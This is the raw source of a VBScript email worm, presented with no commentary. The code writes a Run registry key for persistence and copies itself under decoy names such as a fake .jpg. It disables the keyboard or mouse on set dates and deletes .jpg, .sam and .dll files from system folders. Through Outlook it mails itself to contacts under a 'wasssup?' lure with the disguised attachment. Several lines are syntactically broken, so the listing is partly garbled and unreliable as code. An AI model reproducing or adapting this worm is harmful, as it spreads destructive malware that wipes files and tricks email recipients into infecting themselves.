   On Error Resume next
   Set ED = CreateObject("WScript.Shell")ED.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RunTime1", "wscript.exe %windows%\Virus.vbs %*"
   set FSO=CreateObject("Scripting.FileSystemObject")
   FSO.CopyFile Virus, "%windir%\Virus.vbs"
   FSO.CopyFile Virus, "%System%\MsDos673.exe.vbs"
   FSO.CopyFile Virus, "%windir%\msboobs..vbs"
   FSO.CopyFile Virus, "%windir%\coolvirus.vbs"
   FSO.CopyFile Virus, "%windir%\pizza.vbs"
   FSO.CopyFile Virus, "%windir%\drinks4u.vbs"
   FSO.CopyFile Virus, "%windir%\outcoldNhot.vbs"
   FSO.CopyFile Virus, "%windir%\lifesucksbad.vbs"
   FSO.CopyFile Virus, "%windir%\Idontwantwar.vbs"
   FSO.CopyFile Virus, "%windir%\PeaCE.vbs"
   FSO.CopyFile Virus, "%windir%\PC00031.jpg.vbs"

   Do
   if month(now) =1 and day(now) =14 then
   shell "%windir%\rundll32.exe Keyboard,disable"
   end if
   if month(now) =2 and day(now) =14 then
   shell "%windir%\rundll32.exe mouse,disable"
   end if
   if month(now) =3 and day(now) =14 then
   shell "%windir%\rundll32.exe Keyboard,disable"
   end if
   if month(now) =4 and day(now) =14 then
   shell "%windir%\rundll32.exe mouse,disable"
   end if
   if month(now) =5 and day(now) =14 then
   shell "%windir%\rundll32.exe Keyboard,disable"
   end if
   if month(now) =6 and day(now) =14 then
   shell "%windir%\rundll32.exe mouse,disable"
   end if
   if month(now) =7 and day(now) =14 then
   shell "%windir%\rundll32.exe Keyboard,disable"
   end if
   if month(now) =8 and day(now) =14 then
   shell "%windir%\rundll32.exe mouse,disable"
   end if
   if month(now) =9 and day(now) =14 then
   shell "%windir%\rundll32.exe Keyboard,disable"
   end if
   if month(now) =10 and day(now) =14 then
   shell "%windir%\rundll32.exe mouse,disable"
   end if
   if month(now) =11 and day(now) =14 then
   shell "%windir%\rundll32.exe Keyboard,disable"
   end if
   if month(now) =12 and day(now) =14 then
   shell "%windir%\rundll32.exe mouse,disable"
   end if
   if month(now) =12 and day(now) =25 then
   MsgBox "Happy XMAS N a HaPpY nEw YeAr!"
   end if
   if month(now) =1 and day(now) =1 then
   GoTo MailTime
   end if
   if month(now) =2 and day(now) =2 then MailTime
   end if
   if month(now) =3 and day(now) =3 then MailTime
   end if
   if month(now) =4 and day(now) =4 then MailTime
   end if
   if month(now) =5 and day(now) =5 then MailTime
   end if
   if month(now) =6 and day(now) =6 then MailTime
   end if
   if month(now) =7 and day(now) =7 then MailTime
   end if
   if month(now) =8 and day(now) =8 then MailTime
   end if
   if month(now) =9 and day(now) =9 then MailTime
   end if
   if month(now) =10 and day(now) =10 then MailTime
   end if
   if month(now) =11 and day(now) =11 then MailTime
   end if
   if month(now) =12 and day(now) =12 then MailTime
   end if
   next
   FSO.DeleteFile ("C:\*.jpg")
   FSO.DeleteFile ("C:\*.sam")
   FSO.DeleteFile ("C:\*.dll")
   FSO.DeleteFile ("%windir%\*.jpg")
   FSO.DeleteFile ("%windir%\*.sam")
   FSO.DeleteFile ("%windir%\*.dll")
   FSO.DeleteFile ("%System%\*.jpg")
   FSO.DeleteFile ("%System%\*.sam")
   FSO.DeleteFile ("%System%\*.dll")
   Do
   Dim File1
   If Not (File1.fileexists(wscript.scriptfullname)) Then
   Set newfile= File1.createtextfile(wscript.scriptfullname, True)
   newfile.writepayload
   newfile.Close
   End If
   Loop
   end
   MailTime:
   On Error Resume next
   Set olOutlookApp = GetObject(, "Outlook.Application")
     If Err <> 0 Then
       Set olOutlookApp = CreateObject("Outlook.Application")
         blnNewOutlookApp = True
     End If
   on error resume next
    Set olEMail = olOutlookApp.CreateItem(olMailItem)
     With olEMail
         For x = 1 To NoToRecp
         .Recipients.Add AddressTo(x)
         Next x
         If NoCCRecp <= 0 Then GoTo Send
         For x = 1 To NoCCRecp
         .Recipients.Add(AddressCC(x)).Type = olCC
          End if
          Next x
   Send:
         .Subject = "wasssup?"
         .Body = "here dont show nobody ok???"
         .Attachments.Add %windir%\PC00031.jpg.vbs, olByValue, ,"me"
         .Send
     End With
